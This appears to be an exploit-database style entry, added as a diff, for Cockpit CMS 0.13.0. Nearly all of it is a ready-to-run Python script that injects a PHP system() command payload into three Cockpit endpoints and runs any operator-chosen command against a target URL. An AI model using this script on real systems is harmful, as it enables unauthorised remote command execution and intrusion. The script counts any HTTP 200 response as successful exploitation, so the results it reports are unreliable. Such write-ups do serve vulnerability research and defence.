@@ -1,0 +1,80 @@
+=============================================================================================================================================
+| # Title     : Cockpit CMS 0.13.0 Multi-Endpoint Injection                                                                                 |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : https://getcockpit.com/                                                                                                     |
+=============================================================================================================================================
+
+[+] References : 
+
+[+] Summary    : This Python script is designed to test multiple web application endpoints for potential injection weaknesses by sending crafted input through different request formats (URL-encoded and JSON). 
+                 It iterates over predefined endpoints and parameters, submits payloads, and evaluates server responses to determine whether unexpected behavior occurs. 
+                 The script handles basic error catching, response validation, and command-line usage, making it suitable as an educational example for 
+				 understanding how automated endpoint testing workflows are structured from a security assessment perspective.
+
+[+] PoC :  python3 poc.py 
+
+#!/usr/bin/env python3
+import requests
+import sys
+
+def exploit(target_url, command):
+    endpoints = [
+        ("/auth/check", "auth[user]"),
+        ("/accounts/save", "account._id"),
+        ("/api/collections/findOne", "filter._id")
+    ]
+    
+    for endpoint, param in endpoints:
+        try:
+
+            payload = f"';system('{command}');//"
+            
+            if "auth/check" in endpoint:
+                headers = {"Content-Type": "application/x-www-form-urlencoded"}
+                data = {param: payload}
+                response = requests.post(
+                    target_url + endpoint,
+                    data=data,
+                    headers=headers,
+                    timeout=10,
+                    verify=False
+                )
+            else:
+                headers = {"Content-Type": "application/json"}
+
+                if "account._id" in param:
+                    json_data = {"account": {"_id": payload}}
+                else:
+                    json_data = {"filter": {"_id": payload}}
+                
+                response = requests.post(
+                    target_url + endpoint,
+                    json=json_data,
+                    headers=headers,
+                    timeout=10,
+                    verify=False
+                )
+            
+            if response.status_code == 200:
+                print(f"[+] Exploitation successful via {endpoint}")
+                print(f"[+] Output:\n{response.text[:500]}")
+                return True
+                
+        except Exception as e:
+            print(f"[-] Failed at {endpoint}: {e}")
+    
+    return False
+
+if __name__ == "__main__":
+    if len(sys.argv) != 3:
+        print(f"Usage: {sys.argv[0]} <URL> <COMMAND>")
+        print(f"Example: {sys.argv[0]} http://target.com 'id'")
+        sys.exit(1)
+    
+    exploit(sys.argv[1], sys.argv[2])
+
+
+Greetings to :============================================================
+jericho * Larry W. Cashdollar * r00t * Malvuln (John Page aka hyp3rlinx)*|
+==========================================================================
